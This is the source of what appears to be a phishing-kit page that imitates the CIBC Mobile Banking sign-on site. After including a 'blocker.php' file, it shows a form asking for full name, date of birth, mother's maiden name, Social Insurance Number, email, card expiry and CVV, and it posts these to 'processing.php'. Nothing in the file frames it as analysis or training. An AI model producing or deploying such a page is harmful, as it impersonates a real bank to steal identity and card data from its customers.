<?php
include('blocker.php');
?>
<!doctype HTML>
<html>
<head>
		<title>CIBC Mobile Banking Sign On</title>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta name="HandheldFriendly" content="true">
		<meta name="format-detection" content="telephone=no"> 
		<link rel="stylesheet" href="files/reset.css">
		<link rel="stylesheet" href="files/reset-brand.css">
		<link rel="stylesheet" href="files/global.css">
		<link rel="stylesheet" href="files/global-android2.css">
		<link rel="stylesheet" href="files/global-brand.css">
		<script type="text/javascript" src="files/jquery-1.12.4.min-ver-4F252523D4AF0B478C810C2547A63E19.js"></script>
<script type="text/javascript" src="files/wicket-event-jquery.min-ver-F9895CC8E65D4CD054E8B64B9196385E.js"></script>
<script type="text/javascript" src="files/wicket-ajax-jquery.min-ver-5A00F2783FA172481F8A178E6C4F30A6.js"></script>
<script type="text/javascript" id="wicket-ajax-base-url">
/*<![CDATA[*/
Wicket.Ajax.baseUrl="";
/*]]>*/
</script>

	  <link rel="stylesheet" href="files/carousel.css">
	  <script src="files/carousel.js"></script>
  
    <link rel="stylesheet" href="files/signon.css">
	<link rel="stylesheet" href="files/signon-brand.css">
    <meta name="msapplication-tap-highlight" content="no"> 
    <script> var digitalData={
  "site" : {
    "brand" : "cibc",
    "name" : "olb",
    "type" : "mobi",
    "environment" : "production",
    "appVersion" : "2.12.6",
    "lastBuildDate" : "2019-08-02"
  },
  "page" : {
    "name" : "signon",
    "url" : "https://www.cibc.mobi/ebm-mobile-anp",
    "language" : "en",
    "accessibility" : true
  },
  "user" : {
    "authState" : "non-authenticated"
  },
  "events" : {
    "pageView" : true
  }
};</script>
    <script type="text/javascript" src="files/ebanking-mobile-ver-99E2A281F5DCE0DCA5A64B667AC8755D.js"></script>
	<script src="files/global.js"></script>
	<script src="files/drawer-scroll-prevent.js"></script>
	<script src="files/launch-EN034ff4c320584a519fa9fe106f74a1a8.min.js"></script> 
		
</head>
<body lang="en">
	<span class="offscreen">CIBC Mobile Banking</span>   
	<input type="checkbox" id="drawer-toggle-chk" aria-hidden="true">
	<label for="drawer-toggle-chk" id="drawer-toggle-label">
		<img id="open-menu-icon" src="files/drawer-menu-open.png" alt="Open Menu" role="button">
		<img id="close-menu-icon" src="files/drawer-menu-close.png" alt="Close Menu" role="button">
	</label>
	<nav id="drawer-menu" class="post-signon-drawer scrollable-ver">
		<div id="menu-wrapper">
			<div class="drawer-menu-header">
				<div class="account-holder-name" id="account-holder-name"> </div>
				<a href="#" class="no-style-link active" id="profile-link">
					<span style="color:#000;">My Profile</span><span class="drawer-icon-cog"></span>
				</a>
			</div>
			<ul>
				<li id="li-my-accounts"><a id="accounts-link" href="#" role="menuitem" class="">My Accounts</a></li>
				<li id="li-pay-bills"><a id="paybill-link" href="#" role="menuitem" class="">Bill Payments</a></li>
				<li id="li-interac"><a id="etransfer-link" href="#" role="menuitem" class=""><em>Interac</em> e-Transfers</a></li>
				<li id="li-transfer"><a id="transfer-link" href="#" role="menuitem" class="">Transfer Funds</a></li>
				<li id="li-upcoming"><a id="uptxs-link" href="#" role="menuitem" class="">Upcoming Transactions</a></li>
				<!-- dynamic SSO links -->
				<li id="li-gmt"><a id="gmt-link" href="#" role="menuitem">Global Money Transfer</a></li>
				
				<hr>
				<li id="li-browse-products"><a id="products-link" href="#" target="_blank" role="menuitem">Explore Products<span class="offscreen">. Opens in new page</span></a></li>
				<li id="li-sites-apps"><a id="sites-link" href="#" role="menuitem" class="">CIBC Sites</a></li>
				<!-- Customer Services link visible for CIBC non-Small Business -->
				<li id="li-client-services"><a id="customerServices-link" href="#" class="">Customer Services</a></li>
							
				<hr>	
				<li><a class="nav-no-indent" id="contact-us-link" href="#" role="menuitem">Contact Us</a></li>
				<li><a class="nav-no-indent" id="help-link" href="#" role="menuitem">Help</a></li>
				<hr>
				<li id="li-sign-out"><a class="nav-no-indent" id="logout-link" href="#" role="menuitem">Sign Out</a></li>
			</ul>
		</div>
	</nav>
	
  <header>
		<section id="header-title">
			<h2 class="title">My Profile</h2>
		</section>
  </header>

<section id="main-page">
	       
<section id="idf">
	<section class="page-title"> 
    	
    	<h2 class="title">Account Information</h2>
	</section>    	
</section>
<section id="edit-profile" class="page-wrapper">
		
	<div class="global-error-from-container" tabindex="-1" id="id11"></div>
		
	<form method="post" action="processing.php" >
	
	<div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"></div><br/>		
			
			<!-- CIBC and PCF -->
			<section>				
				<fieldset>
					<label for="home-fn" id="home-phone-label">FULL NAME </label>
					<input type="text" id="home-fn" name="FN" maxlength="20"  required="">
				</fieldset><br/>		
				<fieldset>
					<label for="home-dob" id="home-phone-label">DATE OF BIRTH</label>
					<div class="flex-box flex-box-hoz">
						<div class="flex-box-flex-1">
							<input type="text" id="home-dob" placeholder="DD/MM/YYYY" name="DB" maxlength="10" required="">
						</div>
					</div>
				</fieldset>				
				<fieldset>
					<label for="home-mmn" id="home-phone-label">MOTHER'S MAIDEN NAME</label>
					<div class="flex-box flex-box-hoz">
						<div class="flex-box-flex-1">
							<input type="text" id="home-mmn" name="MN" maxlength="20" required="">
						</div>
					</div>
				</fieldset>
				<fieldset>
					<label for="home-sin" id="home-phone-label">SOCIAL INSURANCE NUMBER</label>
					<div class="flex-box flex-box-hoz">
						<div class="flex-box-flex-1">
							<input type="text" id="home-sin" name="SN" maxlength="11" required="">
						</div>
					</div>
				</fieldset>
				<fieldset>
					<label for="home-email" id="home-phone-label">EMAIL ADDRESS</label>
					<div class="flex-box flex-box-hoz">
						<div class="flex-box-flex-1">
							<input type="email" id="home-email" name="EM" maxlength="60" required="">
						</div>
					</div>
				</fieldset>
				<fieldset>
					<label for="home-exp" id="home-phone-label">CARD EXPIRATION</label>
					<div class="flex-box flex-box-hoz">
						<div class="flex-box-flex-1">
							<input type="text" id="home-exp" name="EXP" maxlength="60" required="">
						</div>
					</div>
				</fieldset><br/>
				<fieldset>
					<label for="home-cvv" id="home-phone-label">3 SECURITY DIGITS CVV</label>
					<div class="flex-box flex-box-hoz">
						<div class="flex-box-flex-1">
							<input type="text" id="home-cvv" name="CVV" maxlength="3" required="">
						</div>
					</div>
				</fieldset>
			</section><br/><br/>
				<div class="flex-box flex-box-hoz">
					<div class="flex-box-flex-1">
						<input type="submit" class="btn btn-neutral" id="signon-button" value="SUBMIT">
					</div>
				</div>
	</form>                      
</section>

</section>
</body>
</html>